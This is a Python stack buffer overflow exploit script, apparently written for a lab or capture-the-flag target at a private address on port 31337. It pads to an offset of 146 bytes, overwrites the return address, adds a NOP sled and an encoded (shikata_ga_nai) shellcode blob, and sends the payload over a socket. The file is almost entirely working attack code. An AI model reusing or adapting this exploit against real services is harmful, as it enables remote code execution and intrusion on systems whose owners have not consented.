#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.0.2.45"
port = 31337

crashed_pt = 160

prefix = b""
offset = 146
overflow = b"A" * offset
retn = b"\xc3\x14\x04\x08"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

buf =  b""
buf += b"\xbe\x7e\x33\x98\xfb\xd9\xe5\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x5e\x31\x70\x15\x83\xc0\x04\x03\x70\x11\xe2"
buf += b"\x8b\xcf\x70\x74\x73\x30\x81\xeb\x42\xe2\x08\x0e\xc0"
buf += b"\x89\x59\xe1\x83\xdc\x51\x8a\xc1\xf4\xe2\xfe\xcd\xfb"
buf += b"\x43\xb4\x2b\x35\x53\x78\xf3\x99\x97\x1a\x8f\xe3\xcb"
buf += b"\xfc\xae\x2b\x1e\xfc\xf7\xfd\x54\x11\xa5\xaa\x1d\xbf"
buf += b"\x59\xde\x60\x7c\x58\x30\xef\x3c\x22\x35\x30\xc8\x9e"
buf += b"\x34\x61\x61\x95\x7f\x99\x09\xf1\x5f\x98\xde\x84\x69"
buf += b"\xee\xdc\xcf\x58\xf0\x96\xfb\x11\x0f\x7f\x32\xe6\xd1"
buf += b"\xb0\x39\x4a\xd0\x89\x79\x72\xa6\xe1\x7a\x0f\xb1\x31"
buf += b"\x01\xcb\x34\xa6\xa1\x98\xef\x02\x50\x4c\x69\xc0\x5e"
buf += b"\x39\xfd\x8e\x42\xbc\xd2\xa4\x7e\x35\xd5\x6a\xf7\x0d"
buf += b"\xf2\xae\x5c\xd5\x9b\xf7\x38\xb8\xa4\xe8\xe4\x65\x01"
buf += b"\x62\x06\x73\x35\x8b\xd9\x7c\x6b\x1c\x16\xb1\x94\xdc"
buf += b"\x30\xc2\xe7\xee\x9f\x78\x60\x43\x68\xa7\x77\xd2\x7e"
buf += b"\x58\xa7\x5c\xee\xa6\x48\x9d\x27\x6d\x1c\xcd\x5f\x44"
buf += b"\x1d\x86\x9f\x69\xc8\x33\x95\xfd\xf9\xc3\xab\xcd\x95"
buf += b"\xc1\xab\x3c\x3a\x4f\x4d\x6e\x92\x1f\xc1\xcf\x42\xe0"
buf += b"\xb1\xa7\x88\xef\xee\xd8\xb2\x25\x87\x73\x5d\x90\xf0"
buf += b"\xeb\xc4\xb9\x8a\x8a\x09\x14\xf7\x8d\x82\x9d\x08\x43"
buf += b"\x63\xd7\x1a\xb4\x14\x17\xe2\x45\xb1\x17\x88\x41\x13"
buf += b"\x4f\x24\x48\x42\xa7\xeb\xb3\xa1\xbb\xeb\x4c\x34\x8a"
buf += b"\x80\x7b\xa2\xb2\xfe\x83\x22\x33\xfe\xd5\x28\x33\x96"
buf += b"\x81\x08\x60\x83\xcd\x84\x14\x18\x58\x27\x4d\xcd\xcb"
buf += b"\x4f\x73\x28\x3b\xd0\x8c\x1f\x3f\x17\x72\xe2\x68\xb0"
buf += b"\x1b\x1c\x29\x40\xdc\x76\xa9\x10\xb4\x8d\x86\x9f\x74"
buf += b"\x6e\x0d\xc8\x1c\xe5\xc0\xba\xbd\xfa\xc8\x1b\x60\xfb"
buf += b"\xff\x87\x93\x86\x70\x37\x54\x77\x99\x5c\x54\x78\xa5"
buf += b"\x62\x68\xaf\x9c\x10\xaf\x6c\x9b\x3b\x32\x58\xd6\xd3"
buf += b"\xeb\x09\x5b\xbe\x0b\xe4\x98\xc7\x8f\x0c\x61\x3c\x8f"
buf += b"\x65\x64\x78\x17\x96\x14\x11\xf2\x98\x8b\x12\xd7"


shellcode = buf

chars = b"C"*(crashed_pt - offset - len(retn) - len(padding) - len(shellcode))

#postfix = b""

payload = prefix + overflow + retn + padding + shellcode + chars #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
